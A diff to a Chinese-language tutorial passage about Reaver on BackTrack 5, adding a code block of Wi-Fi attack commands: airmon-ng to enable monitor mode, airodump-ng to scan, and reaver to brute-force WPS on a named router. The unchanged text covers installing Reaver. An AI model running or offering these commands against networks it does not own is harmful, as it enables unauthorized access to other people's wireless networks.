@@ -1,3 +1,15 @@
+```
+iwconfig
+airmon-ng start wlan
+airodump-ng wlan0mon
+
+ 44:97:5A:C7:BF:DA
+
+
+
+reaver -i wlan0mon -b 44:97:5A:C7:BF:DA -vv -1 414
+```
+
 （文章更新：Reaver在R3版中已经预装，如果你安装的是BT5的R3版，这一步骤可以忽略，直接跳到第3步。）
 
 Reaver已经加入了BackTrack的最新版软件包，只是还没有集成到live DVD里，所以，在本文最初撰写的时候，你还需要手动安装Reaver。要安装Reaver，首先设置电脑联网。
